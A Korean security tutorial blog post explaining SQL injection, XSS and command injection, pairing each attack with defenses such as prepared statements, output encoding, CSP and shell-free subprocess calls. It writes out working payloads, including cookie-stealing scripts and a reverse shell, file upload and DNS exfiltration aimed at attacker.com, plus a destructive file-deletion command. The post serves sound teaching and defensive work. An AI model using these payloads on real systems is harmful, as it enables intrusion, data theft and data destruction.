---
title: "공격자의 시선으로 보는 보안: 3편 - 웹 공격 Part 1 (Injection)"
date: 2026-02-22T16:00:00+09:00
categories:
  - study
  - Security
tags: ["security", "sql-injection", "xss", "command-injection", "owasp", "web-security", "legacy-attacks"]
summary: "네트워크 레이어를 통과하면 다음은 애플리케이션이다. SQL Injection, XSS, Command Injection은 1990년대 말부터 지금까지 웹 공격의 핵심이다. 입력값이 그대로 명령어로 해석될 때 발생하는 인젝션 공격의 원리와 방어를 분석한다."
showtoc: true
tocopen: true
draft: false
series: ["공격자의 시선으로 보는 보안"]
series_order: 3
---

## 배경

네트워크 방어가 강화되면서 공격자는 **애플리케이션 레이어**로 이동했다.
방화벽은 포트 80/443을 허용한다. 웹 서비스를 운영하는 한 이 포트는 열려 있어야 한다.

인젝션 공격의 공통 원리는 하나다.

> **사용자 입력이 데이터로 처리되지 않고 명령어로 해석될 때 발생한다.**

SQL Injection은 1998년에 처음 공식 문서화되었고, XSS는 1999년이다.
25년이 지난 지금도 OWASP Top 10에서 사라지지 않는다.

---

## 1. SQL Injection

### 원리

웹 애플리케이션이 사용자 입력을 그대로 SQL 쿼리에 조합할 때 발생한다.

**취약한 코드 (Java)**:
```java
String query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'";
```

사용자가 username에 `admin' --`을 입력하면:
```sql
-- 실제로 실행되는 쿼리
SELECT * FROM users WHERE username='admin' --' AND password='anything'
-- '--'는 SQL 주석 → password 조건이 무시됨
-- 결과: admin 계정으로 로그인 성공 (패스워드 검증 없이)
```

### 공격 유형

#### 1.1 Classic (In-band) SQL Injection

결과가 페이지에 직접 출력되는 경우.

```sql
-- 에러 기반 (Error-based)
-- 의도적으로 에러를 발생시켜 DB 정보 추출
' AND 1=CONVERT(int, (SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES))--
-- 에러 메시지에 테이블 이름이 포함될 수 있음

-- UNION 기반 (Union-based)
-- 원래 쿼리 결과에 추가 데이터를 붙임
' UNION SELECT username, password, null FROM users--

-- 컬럼 수 파악 (중요)
' ORDER BY 1-- → 성공
' ORDER BY 2-- → 성공
' ORDER BY 3-- → 에러 → 컬럼 수는 2개
```

**실제 시나리오**:
```
URL: http://target.com/products?id=1

공격: http://target.com/products?id=1 UNION SELECT username,password FROM users--

페이지에 원래 상품 정보 + 사용자 계정 정보가 함께 출력
```

#### 1.2 Blind SQL Injection

결과가 페이지에 출력되지 않는 경우. 응답의 차이로 추론한다.

**Boolean-based Blind**:
```sql
-- 조건이 참일 때와 거짓일 때 페이지 응답이 다름을 이용
' AND 1=1--   → 정상 페이지 (참)
' AND 1=2--   → 다른 페이지 또는 에러 (거짓)

-- 데이터 한 글자씩 추출
' AND SUBSTRING(password,1,1)='a'--
' AND SUBSTRING(password,1,1)='b'--
...반복...
```

**Time-based Blind**:
```sql
-- 응답 시간 차이로 추론 (페이지 변화 없을 때)
'; IF (1=1) WAITFOR DELAY '0:0:5'--  → 5초 지연 (참)
'; IF (1=2) WAITFOR DELAY '0:0:5'--  → 지연 없음 (거짓)

-- MySQL
' AND SLEEP(5)--

-- PostgreSQL
'; SELECT pg_sleep(5)--
```

#### 1.3 Out-of-band SQL Injection

결과를 DNS나 HTTP로 외부 서버에 전송.

```sql
-- SQL Server에서 DNS를 통해 데이터 탈취
'; EXEC xp_dirtree '\\attacker.com\' + (SELECT password FROM users WHERE id=1) + '\share'--
-- 공격자 DNS 서버에 쿼리가 기록됨
```

### 실제 피해 수준

```sql
-- 데이터베이스 목록 조회
' UNION SELECT schema_name, null FROM information_schema.schemata--

-- 테이블 목록 조회
' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='target_db'--

-- 파일 읽기 (MySQL FILE 권한이 있는 경우)
' UNION SELECT LOAD_FILE('/etc/passwd'), null--

-- OS 명령 실행 (SQL Server xp_cmdshell)
'; EXEC xp_cmdshell('whoami')--
```

### 방어

**1. Prepared Statement (가장 중요)**:
```java
// 취약한 코드
String query = "SELECT * FROM users WHERE username='" + username + "'";

// 안전한 코드
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username=? AND password=?"
);
stmt.setString(1, username);
stmt.setString(2, password);
// 입력값은 데이터로만 처리, 쿼리 구조 변경 불가
```

**2. ORM 사용 (JPA, Hibernate)**:
```java
// JPA Query (파라미터 바인딩 자동 처리)
TypedQuery<User> query = em.createQuery(
    "SELECT u FROM User u WHERE u.username = :username", User.class
);
query.setParameter("username", username);
```

**3. 최소 권한 원칙**:
```sql
-- 애플리케이션 DB 계정에 필요한 권한만 부여
GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'app_user'@'localhost';
-- DROP, FILE, EXECUTE 권한 부여 안 함
```

**4. WAF + 에러 메시지 숨기기**:
```
SQL 에러 메시지를 사용자에게 노출 금지
→ 에러 기반 공격 차단
```

---

## 2. XSS (Cross-Site Scripting)

### 원리

사용자 입력이 HTML로 출력될 때, 스크립트가 포함되면 브라우저가 실행한다.
Same-Origin Policy가 있지만, **같은 사이트 내에서 실행되는 스크립트**는 쿠키/세션에 접근 가능하다.

### 공격 유형

#### 2.1 Reflected XSS

입력이 즉시 응답에 반영될 때 발생. URL에 스크립트 포함.

```
취약한 URL:
http://target.com/search?q=<script>alert('XSS')</script>

서버 응답 HTML:
<p>검색 결과: <script>alert('XSS')</script></p>
→ 브라우저가 스크립트 실행
```

**실제 공격 (세션 탈취)**:
```javascript
// 공격자가 URL에 삽입하는 스크립트
<script>
new Image().src = "http://attacker.com/steal?cookie=" + document.cookie;
</script>

// 피해자가 이 URL을 클릭하면 쿠키가 공격자 서버로 전송
// 공격자는 세션 쿠키로 계정 탈취
```

피해자에게 악성 URL을 클릭하게 만드는 방법:
- 이메일 링크
- 단축 URL
- 피싱 페이지

#### 2.2 Stored XSS (가장 위험)

스크립트가 DB에 저장되어, 페이지를 방문하는 모든 사용자에게 실행된다.

```
시나리오: 게시판 댓글에 스크립트 삽입

공격자 입력 (댓글):
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'http://attacker.com/keylog', true);
  xhr.send('key=' + document.cookie + '&url=' + location.href);
</script>

결과:
→ DB에 저장
→ 이 댓글을 보는 모든 사용자의 쿠키가 공격자에게 전송
→ 관리자가 보면 관리자 세션 탈취
```

실제 사례: MySpace Samy Worm (2005)
- 자가 복제 XSS 웜
- 10시간 내 100만 명의 MySpace 프로필 감염

#### 2.3 DOM-based XSS

서버 응답과 무관하게 JavaScript가 DOM을 직접 조작할 때 발생.

```javascript
// 취약한 클라이언트 코드
var name = document.location.hash.substring(1);
document.getElementById("welcome").innerHTML = "Hello, " + name;

// 공격 URL
http://target.com/page#<img src=x onerror=alert('XSS')>

// 서버 응답은 정상이지만 브라우저에서 DOM 조작 중 스크립트 실행
```

### 탈취 가능한 정보

```javascript
// 세션 쿠키
document.cookie

// 로컬 스토리지 (JWT 토큰 등)
localStorage.getItem('token')

// 키로깅
document.addEventListener('keypress', function(e) {
    // 입력값을 외부로 전송
});

// 피싱 오버레이 (가짜 로그인 화면)
document.body.innerHTML = '<div style="...">로그인 필요: <form>...</form></div>';
```

### 방어

**1. Output Encoding (핵심)**:
```java
// OWASP Java Encoder 사용
import org.owasp.encoder.Encode;

// HTML Context
String safe = Encode.forHtml(userInput);

// JavaScript Context
String safe = Encode.forJavaScript(userInput);

// URL Context
String safe = Encode.forUriComponent(userInput);
```

```
인코딩 결과 예시:
<  → &lt;
>  → &gt;
"  → &quot;
'  → &#x27;
&  → &amp;
→ 스크립트 태그가 텍스트로 표시됨 (실행 안 됨)
```

**2. Content Security Policy (CSP)**:
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com

# 인라인 스크립트 차단
# 허용된 도메인에서만 스크립트 로드 가능
# XSS 성공해도 외부로 데이터 전송 차단
```

**3. HttpOnly Cookie**:
```http
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict

# HttpOnly: JavaScript에서 document.cookie로 접근 불가
# → XSS로 세션 쿠키 탈취 차단
```

---

## 3. Command Injection

### 원리

웹 애플리케이션이 사용자 입력을 OS 명령어의 일부로 사용할 때 발생한다.

**취약한 코드 (Python)**:
```python
import os

# 사용자가 입력한 IP를 ping
def ping_host(ip):
    result = os.system("ping -c 1 " + ip)
    return result
```

공격자가 ip에 `127.0.0.1; cat /etc/passwd`를 입력하면:
```bash
# 실제로 실행되는 명령
ping -c 1 127.0.0.1; cat /etc/passwd
# ';' 이후의 명령도 실행됨 → /etc/passwd 내용 출력
```

### 명령 구분자

```bash
# 다양한 명령 구분자 (모두 시도)
127.0.0.1; whoami        # 세미콜론: 항상 실행
127.0.0.1 && whoami      # AND: 이전 명령 성공 시 실행
127.0.0.1 || whoami      # OR: 이전 명령 실패 시 실행
127.0.0.1 | whoami       # Pipe: 이전 출력을 다음 입력으로
127.0.0.1 `whoami`       # 백틱: 서브쉘 실행
127.0.0.1 $(whoami)      # 달러 괄호: 서브쉘 실행 (현대)
```

### 실제 피해

```bash
# 서버 정보 수집
; uname -a
; cat /etc/passwd
; id

# 리버스 쉘 (공격자 서버에 접속)
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
# 공격자는 nc -lvp 4444로 대기
# 연결 성공 시 서버 쉘 획득

# 데이터 탈취
; tar czf /tmp/data.tgz /var/www/html/config/
; curl -F "file=@/tmp/data.tgz" http://attacker.com/upload

# 랜섬웨어 (최악의 시나리오)
; find / -name "*.db" -exec rm {} \;
```

### 방어

**1. 시스템 명령 호출 자체를 금지** (가장 안전):
```python
# 취약: os.system(), subprocess with shell=True
# 안전: 라이브러리 직접 사용

# ping 대신 Python icmp 라이브러리
import pythonping
response = pythonping.ping(ip)  # 쉘 명령 없음
```

**2. 파라미터 분리 (shell=False)**:
```python
import subprocess

# 취약
subprocess.run("ping -c 1 " + ip, shell=True)

# 안전 (리스트로 전달 시 쉘 해석 안 함)
subprocess.run(["ping", "-c", "1", ip], shell=False)
# ip가 "127.0.0.1; rm -rf /"여도 ping의 인자로만 처리됨
```

**3. 입력값 화이트리스트 검증**:
```python
import re

def validate_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if not re.match(pattern, ip):
        raise ValueError("유효하지 않은 IP 주소")
    return ip
```

---

## 4. 공격 비교 정리

| 공격 | 발생 위치 | 피해 대상 | 핵심 원인 | 핵심 방어 |
|------|----------|----------|----------|----------|
| SQL Injection | DB 쿼리 | 데이터베이스 | 입력 + 쿼리 직접 조합 | Prepared Statement |
| XSS | HTML 출력 | 다른 사용자 | 입력을 HTML로 출력 | Output Encoding, CSP |
| Command Injection | OS 명령 | 서버 전체 | 입력 + 명령 직접 조합 | 라이브러리 사용, 파라미터 분리 |

### 세 공격의 공통점

```
입력값이 다른 컨텍스트로 전환될 때 발생:
  SQL Injection: 데이터 → SQL 쿼리
  XSS: 데이터 → HTML/JavaScript
  Command Injection: 데이터 → OS 명령

방어의 공통 원칙:
  "입력은 항상 데이터다. 명령어가 될 수 없다."
  → 컨텍스트에 맞는 이스케이프/인코딩
  → 데이터와 명령어를 분리하는 구조 사용
```

---

## 마무리

인젝션 공격은 코드 한 줄의 차이에서 발생한다.
Prepared Statement 대신 문자열 조합, `Encode.forHtml()` 대신 직접 출력.

1998년에 발견된 SQL Injection이 2024년에도 OWASP Top 3에 있는 이유는
"편하게 코딩하고 싶은 욕구"와 "보안 처리의 번거로움"이 충돌하기 때문이다.

다음 편에서는 인젝션이 아닌 **인증, 세션, 접근 제어** 관련 공격을 다룬다.
CSRF, Session Hijacking, Directory Traversal, File Inclusion이 대상이다.

---

*시리즈: 공격자의 시선으로 보는 보안*
- 1편: 정찰과 스캐닝
- 2편: 네트워크 레이어 공격
- **3편: 웹 공격 Part 1 - Injection** ← 현재 글
- 4편: 웹 공격 Part 2 - 인증/세션/접근 제어
- 5편: WAF 우회 기법
